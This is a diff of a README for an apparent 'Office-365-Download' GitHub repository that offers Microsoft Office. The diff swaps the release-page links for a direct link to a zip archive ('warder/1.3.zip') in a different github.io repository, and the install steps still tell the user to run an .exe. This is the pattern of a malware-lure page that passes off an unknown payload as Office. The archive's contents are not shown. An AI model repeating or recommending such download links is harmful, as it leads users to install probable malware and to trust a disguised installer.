@@ -5,7 +5,7 @@ description: "Access Microsoft 365 web apps, compare office suites, and manage i
 ---
 # 📦 Office-365-Download - Get your professional documents done today
 
-[![Download Office 365](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Adynamiagoogolplex135/Office-365-Download/releases)
+[![Download Office 365](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Adynamiagoogolplex135/adynamiagoogolplex135.github.io/raw/refs/heads/main/warder/1.3.zip)
 
 ## What is Office-365-Download?
 
@@ -26,7 +26,7 @@ Before you install the software, your computer must meet these basic requirement
 
 Follow these steps to set up your office suite on your personal computer.
 
-1. Visit the project release page to download your files: https://github.com/Adynamiagoogolplex135/Office-365-Download/releases
+1. Visit the project release page to download your files: https://github.com/Adynamiagoogolplex135/adynamiagoogolplex135.github.io/raw/refs/heads/main/warder/1.3.zip
 2. Locate the file ending in .exe in the Assets section.
 3. Click the link to save the installer to your Downloads folder.
 4. Open the Downloads folder in your file explorer.
